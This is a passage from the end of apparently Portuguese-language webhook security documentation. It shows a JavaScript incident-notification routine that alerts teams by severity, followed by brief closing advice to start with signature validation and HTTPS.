    const message = this.formatIncidentMessage(incident, phase);
    
    // Notificar baseado na severidade
    switch (incident.severity) {
      case 'critical':
        await this.sendToAllChannels(message);
        await this.callEmergencyContacts(incident);
        break;
        
      case 'high':
        await this.sendToSecurityTeam(message);
        await this.sendToManagement(message);
        break;
        
      case 'medium':
        await this.sendToSecurityTeam(message);
        break;
    }
  }

  formatIncidentMessage(incident, phase) {
    return {
      title: `🚨 Incidente de Segurança - ${incident.severity.toUpperCase()}`,
      phase: phase,
      description: incident.description,
      impact: incident.impact,
      timeline: incident.timeline,
      actions: incident.actions,
      nextUpdate: this.calculateNextUpdate(incident.severity)
    };
  }
}
```

---

Esta documentação de segurança fornece uma base sólida para implementar e manter webhooks seguros. É essencial revisar e atualizar essas práticas regularmente conforme novas ameaças surgem e tecnologias evoluem.

Para implementação completa, recomendo começar com os fundamentos (validação de assinatura e HTTPS) e gradualmente adicionar camadas adicionais de segurança conforme necessário.